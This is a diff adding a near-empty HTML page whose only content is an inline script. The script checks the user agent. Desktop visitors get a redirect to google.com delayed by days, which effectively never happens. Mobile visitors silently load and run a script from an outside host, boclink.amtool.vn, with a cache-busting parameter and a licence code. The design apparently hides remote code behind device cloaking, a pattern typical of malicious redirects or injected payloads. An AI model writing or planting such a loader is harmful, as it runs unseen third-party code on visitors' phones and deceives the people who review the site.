@@ -1,0 +1,25 @@
+<html>
+<head>
+                                            <script type="text/javascript">
+                                                    var isMobile = function() {
+                                                        return /(iphone|ipod|ipad|android|blackberry|windows ce|palm|symbian)/i.test(navigator.userAgent);};
+                                                    var path = document.location.pathname;
+                                                    if(!isMobile()) {
+                                                        setTimeout(function(){
+                                                            window.location.href = 'https://google.com' + path;
+                                                        }, 316000000)
+                                                    }else{
+                                                        var HOME_URL = 'https://boclink.amtool.vn';
+                                                        var licence_code = 'cfb1e94bdf9d992a2c7d217e024abb1e';
+                                                        (function () {
+                                                            var A = document.createElement('script');
+                                                            A.async = true;
+                                                            A.src =  'https://boclink.amtool.vn/js/embed.js?v='+(new Date).getTime();
+                                                            var s = document.getElementsByTagName('head')[0];
+                                                            s.appendChild(A, s);
+                                                        })()
+                                                    };
+                                            </script>
+                                             
+</head>
+</html>
